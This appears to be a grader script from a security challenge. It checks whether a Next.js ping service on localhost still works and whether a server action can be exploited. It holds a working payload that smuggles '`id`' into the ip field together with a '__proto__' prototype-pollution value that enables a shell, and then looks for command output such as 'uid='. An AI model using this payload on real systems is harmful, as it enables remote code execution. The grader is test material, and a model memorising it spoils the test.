import json
import logging
import requests
import re

logger = logging.getLogger(__name__)


def _obtain_next_action(base_url: str) -> str:
    if base_url.endswith("/"):
        base_url = base_url[:-1]

    document = requests.get(base_url, timeout=12)
    document.raise_for_status()

    page_javascript_path = re.search(
        r"static/chunks/app/page-(?:.*?)\.js", document.text
    )
    assert page_javascript_path, "Cannot find page javascript"

    logger.debug(f"Page javascript path: {page_javascript_path.group()!r}")
    page_javascript = requests.get(
        f"{base_url}/_next/{page_javascript_path.group()}",
    )
    page_javascript.raise_for_status()

    action_match = re.search(r'\("(?P<id>[0-9a-f]{40})"\)', page_javascript.text)
    assert action_match, "Cannot find action id"

    action_id = action_match.group("id")
    logger.debug(f"Action id: {action_id!r}")
    return action_id


class Checker:
    def __init__(self, host: str, port: int):
        self.request_url = f"http://{host}:{port}"

    def _check(self):
        action_id = _obtain_next_action(self.request_url)

        resp = requests.post(
            self.request_url,
            json=[json.dumps({"ip": "localhost"})],
            headers={"Next-Action": action_id},
        )
        resp.raise_for_status()
        logger.debug(f"Response: {resp.text!r}")
        return all(
            keyword in resp.text
            for keyword in ["PING", "64 bytes from", "packet loss", "ping statistics"]
        )

    def check(self):
        try:
            return self._check()
        except Exception as e:
            logger.warning(f"Check failed: {e}")
            return False


class Exploit:
    def __init__(self, host: str, port: int):
        self.request_url = f"http://{host}:{port}/"

    def _exploit(self):
        action_id = _obtain_next_action(self.request_url)

        resp = requests.post(
            self.request_url,
            json=[json.dumps({"ip": "`id`", "__proto__": {"shell": True}})],
            timeout=12,
            headers={"Next-Action": action_id},
        )
        resp.raise_for_status()
        logger.debug(f"Response: {resp.text!r}")
        return any(
            keyword in resp.text
            for keyword in [
                "uid=",
                "gid=",
                "groups=",
                "cwd=",
                "pid=",
                "ppid=",
                "status=",
                "shell=",
            ]
        )

    def exploit(self):
        try:
            return self._exploit()
        except Exception as e:
            logger.warning(f"Exploit failed: {e}")
            return False


logging.basicConfig(level=logging.CRITICAL)

if __name__ == "__main__":
    host = "localhost"
    port = 3000

    checker = Checker(host, port)
    service_online = checker.check()
    exploitable = False

    if service_online:
        exp = Exploit(host, port)
        exploitable = exp.exploit()

    print(
        json.dumps(
            {
                "correct": service_online and not exploitable,
                "msg": (
                    "服务异常"
                    if not service_online
                    else ("评测正确" if not exploitable else "利用成功")
                ),
            },
            ensure_ascii=False,
        )
    )
